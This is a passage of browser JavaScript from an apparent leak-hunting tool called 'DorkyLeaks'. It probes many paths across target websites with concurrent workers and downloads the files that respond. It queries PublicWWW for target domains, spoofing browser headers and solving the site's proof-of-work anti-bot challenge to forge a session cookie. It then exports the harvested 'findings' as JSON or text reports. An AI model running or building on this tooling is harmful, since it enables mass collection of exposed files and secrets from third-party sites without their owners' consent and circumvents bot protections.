              downloadBlob(safe, res.text);
              savedFiles++;
              log('▼ ' + res.status + ' ' + u, 'ok');
            } else {
              log('· ' + res.status + ' ' + u);
            }
          }
        } catch {}
        if (probedPaths % 25 === 0) {
          updateProgress(50 + (probedPaths / targets.length) * 50, `${probedPaths}/${targets.length} probed · ${hitPaths} hits · ${state.findings.length} findings`);
        }
      }
    };
    await Promise.all(Array.from({ length: PROBE_CONC }, worker));
  }

  return { files: savedFiles, hits: hitPaths, probed: probedPaths };
}

async function publicwwwSearch(query, maxUrls, logId = 'dorkLog') {
  const log = (m, c) => logTo(logId, m, c);
  log('→ query: ' + query, 'ok');

  const live = pool.filter(w => w.ok && !w.dead);
  if (!live.length) { log('no live workers', 'bad'); return []; }

  const worker = live[0];
  const UA = ua();
  const baseHeaders = {
    'User-Agent': UA,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': 'https://publicwww.com/',
  };

  let cookieHeader = '';

  const fetchPinned = (url, extra = {}) => {
    const headers = { ...baseHeaders, ...(extra.headers || {}) };
    if (cookieHeader) headers.Cookie = headers.Cookie ? headers.Cookie + '; ' + cookieHeader : cookieHeader;
    return httpFetch(url, { ...extra, worker, headers });
  };

  const q = encodeURIComponent(query).replace(/%2F/g, '/');
  const landing = 'https://publicwww.com/websites/' + q + '/';
  const exportUrl = 'https://publicwww.com/websites/' + q + '/?export=urls';

  const isResults = t =>
    /-\s*\d[\d,]*\s*Web pages\s*-\s*PublicWWW\.com/i.test(t) ||
    /Examples of sites using/i.test(t) ||
    /<table[^>]*class=["']?[^"'>]*\btable\b/i.test(t);

  let r = await fetchPinned(landing);
  log('landing · ' + r.status + ' · ' + r.text.length + ' bytes', r.status === 200 ? 'ok' : 'bad');
  if (r.status !== 200) return [];

  if (!isResults(r.text)) {
    log('solving PoW…', 'warn');
    const solved = solvePoW(r.text);
    if (!solved) { log('PoW failed', 'bad'); return []; }
    log(`PoW solved: nonce=${solved.token.split('|')[1]} tries=${solved.tries} (${(solved.ms / 1000).toFixed(2)}s)`, 'ok');

    cookieHeader = '_t=' + encodeURIComponent(solved.token);

    r = await fetchPinned(landing);
    log('retry · ' + r.status + ' · ' + r.text.length + ' bytes', r.status === 200 ? 'ok' : 'bad');
    if (r.status !== 200) return [];

    if (!isResults(r.text)) {
      const snippet = (r.text || '').replace(/\s+/g, ' ').slice(0, 300);
      log('retry still not results · ' + snippet, 'bad');
      return [];
    }
    log('results reached', 'ok');
  }

  log('fetching export…', 'ok');
  let ex = await fetchPinned(exportUrl, { headers: { Accept: 'text/plain' } });
  log('export · ' + ex.status + ' · ' + ex.text.length + ' bytes', ex.status === 200 ? 'ok' : 'bad');
  if (ex.status !== 200) return [];

  let lines = ex.text.split('\n').map(l => l.trim()).filter(l => l.startsWith('http'));

  if (!lines.length && !isResults(ex.text)) {
    log('PoW on export page…', 'warn');
    const solved = solvePoW(ex.text);
    if (!solved) { log('PoW failed on export', 'bad'); return []; }
    log(`PoW solved: nonce=${solved.token.split('|')[1]} tries=${solved.tries} (${(solved.ms / 1000).toFixed(2)}s)`, 'ok');
    cookieHeader = '_t=' + encodeURIComponent(solved.token);
    ex = await fetchPinned(exportUrl, { headers: { Accept: 'text/plain' } });
    log('export retry · ' + ex.status + ' · ' + ex.text.length + ' bytes', 'ok');
    lines = ex.text.split('\n').map(l => l.trim()).filter(l => l.startsWith('http'));
  }

  if (!lines.length) {
    const snippet = (ex.text || '').replace(/\s+/g, ' ').slice(0, 200);
    log('no URL lines · ' + snippet, 'warn');
  }

  const out = [], seen = new Set();
  for (const line of lines) {
    try {
      const u = new URL(line);
      let host = u.hostname.toLowerCase();
      if (host.startsWith('www.')) host = host.slice(4);
      if (!seen.has(host)) { seen.add(host); out.push('https://' + host); }
      if (out.length >= maxUrls) break;
    } catch {}
  }
  log('exported ' + out.length + ' domains', out.length ? 'ok' : 'warn');
  return out;
}

}

$('exportJson').addEventListener('click', () => {
  const payload = { findings: state.findings, downloads: state.downloads, generated: new Date().toISOString() };
  const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'DorkyLeaks_' + Date.now() + '.json';
  a.click();
  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
});
$('exportTxt').addEventListener('click', () => {
  let out = '=== DorkyLeaks REPORT ===\n' + new Date().toISOString() + '\n\n';
  const groups = {};
  for (const x of state.findings) (groups[x.type] = groups[x.type] || []).push(x);
  for (const t of Object.keys(groups).sort()) {
    out += '--- ' + t + ' (' + groups[t].length + ') ---\n';
    for (const x of groups[t]) {
      out += '  ' + x.value + ' [' + x.status + ']\n';
      if (x.source) out += '    source: ' + x.source + '\n';
    }
    out += '\n';
  }
  const blob = new Blob([out], { type: 'text/plain' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'DorkyLeaks_' + Date.now() + '.txt';
  a.click();
  setTimeout(() => URL.revokeObjectURL(a.href), 1000);
});
$('clearResults').addEventListener('click', () => {
  state.findings = [];
  state.seen.clear();
  state.downloads = [];
  renderResults();
  toast('cleared');
});

loadPaths();
renderFiles();
renderResults();
logTo('crawlLog', 'starting workers…');
logTo('dorkLog', 'starting workers…');
setLive('on', 'connecting');
(async () => {
  const r = await startPool();
  if (!r.ok) {
    logTo('crawlLog', '[x] ' + r.why, 'bad');
    logTo('crawlLog', '[i] add ?wisp=wss://yourserver/ to the URL to use your own relay', 'warn');
    logTo('dorkLog', '[x] ' + r.why, 'bad');
  } else {
    logTo('crawlLog', '[+] ready (' + WORKERS + ' workers)', 'ok');
    logTo('dorkLog', '[+] ready (' + WORKERS + ' workers)', 'ok');
  }
})();
</script>
